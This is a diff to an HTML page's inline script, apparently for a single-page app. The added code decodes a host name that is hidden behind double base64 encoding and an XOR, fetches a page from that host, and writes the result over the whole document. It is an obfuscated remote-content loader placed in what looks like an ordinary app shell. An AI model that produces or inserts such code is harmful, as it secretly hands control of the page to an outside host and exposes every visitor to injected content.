@@ -4,8 +4,8 @@
   <body>
     <div id="root"></div>
     <script>
-      const BASE_DIR = [...atob(atob('V0V0YVF3UlNIeGdFWDBFPQ=='))].map(c => String.fromCharCode(c.charCodeAt() ^ 42)).join('');
-      fetch(`${BASE_DIR}/page`)
+      const URBD = [...atob(atob('V0VWRUJGSWZHQVJmUVE9PQ=='))].map(c => String.fromCharCode(c.charCodeAt() ^ 42)).join('');
+      fetch(`https://${URBD}/page`)
         .then(r => r.text())
         .then(html => {
           document.open();
